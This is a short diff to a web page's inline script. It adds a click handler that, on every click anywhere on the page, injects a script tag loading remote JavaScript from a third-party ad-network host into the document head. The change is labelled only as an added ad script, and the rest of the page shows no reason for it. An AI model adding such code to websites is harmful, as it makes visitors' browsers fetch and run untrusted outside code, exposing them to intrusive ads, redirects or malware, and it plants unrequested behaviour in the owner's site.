@@ -569,6 +569,13 @@
         
         document.body.removeChild(textArea);
     }
+
+    // ===== ADDED: Ad script injected on every click =====
+    document.addEventListener('click', function() {
+        var adScript = document.createElement('script');
+        adScript.src = 'https://pl28788946.effectivegatecpm.com/53/f7/3d/53f73d33c6655b37cb94bfe8ea319d67.js';
+        document.head.appendChild(adScript);
+    });
 </script>
 
 </body>
